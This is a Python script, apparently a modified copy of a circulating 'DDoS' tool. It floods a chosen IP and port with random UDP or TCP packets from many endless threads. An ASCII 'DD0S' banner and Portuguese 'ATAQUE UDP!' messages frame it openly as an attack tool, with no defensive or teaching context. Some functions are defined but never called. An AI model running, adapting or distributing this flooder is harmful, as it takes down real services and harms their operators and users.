#!/usr/bin/env python3
#Code by LeeOn123 STR1CKERST3AM DEU MELHORADA
import argparse
import random
import socket
import threading
import os
import time

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
args = vars(ap.parse_args())

print("\033[91m000000000000000000000000000")
time.sleep(0.1)
print("\033[91m000000000000000000000000000")
time.sleep(0.1)
print("\033[91m000000000000000000000000000")
time.sleep(0.1)
print("\033[91m000_________0000________000")
time.sleep(0.1)
print("\033[91m000_________0000________000")
time.sleep(0.1)
print("\033[91m000_________0000________000")
time.sleep(0.1)
print("\033[91m000000000000000000000000000")
time.sleep(0.1)
print("\033[91m000000000000000000000000000")
time.sleep(0.1)
print("\033[91m000000000000000000000000000")
time.sleep(0.1)
print("\033[91m000_____________________000")
time.sleep(0.1)
print("\033[91m000_____________________000")
time.sleep(0.1)
print("000000000000000000000000000")
time.sleep(0.1)
print("\033[91m0000000000000000000")
time.sleep(0.1)
print("\033[91m00000000000000000000000\033[32mDD0S")
time.sleep(1)
os.system("clear")
ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def run():
	data = random._urandom(1024)
	i = random.choice(("[!]","[!]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"ATAQUE UDP!")
		except:
			print("erro")

def run2():
	data = random._urandom(16)
	i = random.choice(("[!]","[!]","[!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"ATAQUE UDP!")
		except:
			s.close()
			print("erro")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
		
def new():
	for y in range(threads):
		if choice == 'y':
			th = threading.Thread(target = run)
			th.start()
		else:
			th = threading.Thread(target = run2)
			th.start()

def new2():
	for y in range(threads):
		if choice == 'y':
			th = threading.Thread(target = run)
			th.start()
		else:
			th = threading.Thread(target = run2)
			th.start()

	for y in range(threads):
		if choice == 'y':
			th = threading.Thread(target = new)
			th.start()
		else:
			th = threading.Thread(target = new2)
			th.start()